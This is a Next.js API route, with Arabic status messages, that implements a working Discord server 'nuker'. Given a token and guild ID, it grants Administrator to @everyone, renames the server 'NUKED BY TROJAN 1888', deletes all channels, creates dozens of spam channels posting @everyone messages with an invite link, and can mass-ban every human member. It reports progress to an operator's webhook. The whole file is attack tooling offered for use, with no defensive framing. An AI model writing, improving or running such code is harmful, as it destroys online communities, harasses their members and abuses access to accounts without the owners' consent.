import { NextRequest, NextResponse } from 'next/server'

const DISCORD_API = 'https://discord.com/api/v10'

interface DiscordResponse {
  [key: string]: unknown
}

async function discordRequest(
  method: string,
  endpoint: string,
  token: string,
  body?: object
): Promise<{ data: DiscordResponse | null; status: number }> {
  try {
    const response = await fetch(`${DISCORD_API}/${endpoint}`, {
      method,
      headers: {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'TRJ-Bot/1.0'
      },
      body: body ? JSON.stringify(body) : undefined
    })

    const status = response.status
    
    if (response.status === 204) {
      return { data: {}, status }
    }

    const data = await response.json().catch(() => null)
    return { data, status }
  } catch (error) {
    return { data: null, status: 0 }
  }
}

async function sendWebhook(webhookUrl: string | undefined, embed: object) {
  if (!webhookUrl) return
  await fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ embeds: [embed] })
  }).catch(() => {})
}

export async function POST(request: NextRequest) {
  try {
    const { token, guildId, action } = await request.json()

    if (!token || !guildId || !action) {
      return NextResponse.json({ success: false, error: 'بيانات ناقصة' }, { status: 400 })
    }

    const webhookUrl = process.env.WEBHOOK_URL
    const stats = { deleted: 0, created: 0, spam_sent: 0, banned: 0 }

    // Send start webhook
    await sendWebhook(webhookUrl, {
      title: '🔥 NUKER - جاري',
      color: 0xFFA500,
      fields: [
        { name: '💥 السيرفر', value: `\`${guildId}\``, inline: false },
        { name: '🔥 الإجراء', value: action, inline: true },
        { name: '📊 الحالة', value: 'جاري التنفيذ', inline: true }
      ],
      footer: { text: 'TRJ Bot' },
      timestamp: new Date().toISOString()
    })

    // Get guild data
    const { data: guild } = await discordRequest('GET', `guilds/${guildId}`, token)
    if (!guild) {
      return NextResponse.json({ success: false, error: 'فشل جلب السيرفر' }, { status: 400 })
    }

    if (action === 'nuke') {
      // Full Nuke
      
      // 1. Give admin to everyone
      const { data: roles } = await discordRequest('GET', `guilds/${guildId}/roles`, token)
      if (roles && Array.isArray(roles)) {
        const everyoneRole = roles.find((r: { name: string }) => r.name === '@everyone')
        if (everyoneRole) {
          await discordRequest('PATCH', `guilds/${guildId}/roles/${(everyoneRole as { id: string }).id}`, token, {
            permissions: '8' // Administrator
          })
        }
      }

      // 2. Change server name
      await discordRequest('PATCH', `guilds/${guildId}`, token, {
        name: 'NUKED BY TROJAN 1888'
      })

      // 3. Delete all channels
      const { data: channels } = await discordRequest('GET', `guilds/${guildId}/channels`, token)
      if (channels && Array.isArray(channels)) {
        for (const ch of channels) {
          const deleted = await discordRequest('DELETE', `channels/${(ch as { id: string }).id}`, token)
          if (deleted.status === 200 || deleted.status === 204) {
            stats.deleted++
          }
        }
      }

      // 4. Create channels with spam
      const channelNames = ['nuked-by-trojan', 'by-trojan', 'ez-1888', 'trojan-was-here', 'get-rekt']
      const spamMessage = '@everyone **TROJAN WAS HERE** https://discord.gg/trj'

      for (let i = 0; i < 50; i++) {
        const name = channelNames[i % channelNames.length]
        const { data: newCh } = await discordRequest('POST', `guilds/${guildId}/channels`, token, {
          name,
          type: 0
        })

        if (newCh && (newCh as { id?: string }).id) {
          stats.created++
          
          // Send spam messages
          for (let j = 0; j < 10; j++) {
            const result = await discordRequest('POST', `channels/${(newCh as { id: string }).id}/messages`, token, {
              content: spamMessage
            })
            if (result.status === 200) {
              stats.spam_sent++
            }
          }
        }
      }
    } else if (action === 'banall') {
      // Ban all members
      const { data: members } = await discordRequest('GET', `guilds/${guildId}/members?limit=1000`, token)
      
      if (members && Array.isArray(members)) {
        for (const member of members) {
          const memberData = member as { user?: { id?: string; bot?: boolean }, id?: string }
          const userId = memberData.user?.id || memberData.id
          
          // Skip bots
          if (memberData.user?.bot) continue
          
          const result = await discordRequest('PUT', `guilds/${guildId}/bans/${userId}`, token, {
            delete_message_days: 7
          })
          
          if (result.status === 200 || result.status === 204 || result.status === 201) {
            stats.banned++
          }
        }
      }
    } else if (action === 'delete_channels') {
      // Delete all channels
      const { data: channels } = await discordRequest('GET', `guilds/${guildId}/channels`, token)
      
      if (channels && Array.isArray(channels)) {
        for (const ch of channels) {
          const deleted = await discordRequest('DELETE', `channels/${(ch as { id: string }).id}`, token)
          if (deleted.status === 200 || deleted.status === 204) {
            stats.deleted++
          }
        }
      }
    } else if (action === 'spam') {
      // Spam all channels
      const { data: channels } = await discordRequest('GET', `guilds/${guildId}/channels`, token)
      const spamMessage = '@everyone **TROJAN WAS HERE**'

      if (channels && Array.isArray(channels)) {
        for (const ch of channels) {
          if ((ch as { type: number }).type === 0) { // Text channel
            for (let i = 0; i < 20; i++) {
              const result = await discordRequest('POST', `channels/${(ch as { id: string }).id}/messages`, token, {
                content: spamMessage
              })
              if (result.status === 200) {
                stats.spam_sent++
              }
            }
          }
        }
      }
    }

    // Send completion webhook
    await sendWebhook(webhookUrl, {
      title: '✅ NUKER - تم',
      color: 0x00FF00,
      fields: [
        { name: '💥 السيرفر', value: `\`${guildId}\``, inline: false },
        { name: '🔥 الإجراء', value: action, inline: true },
        { name: '📊 الحالة', value: 'تم بنجاح', inline: true },
        { name: '📈 الإحصائيات', value: `🗑️ حذف: ${stats.deleted} | 📝 إنشاء: ${stats.created} | 📢 سبام: ${stats.spam_sent} | 🔨 حظر: ${stats.banned}`, inline: false }
      ],
      footer: { text: 'TRJ Bot' },
      timestamp: new Date().toISOString()
    })

    return NextResponse.json({ success: true, stats })

  } catch (error) {
    return NextResponse.json({ 
      success: false, 
      error: 'حدث خطأ في الخادم' 
    }, { status: 500 })
  }
}
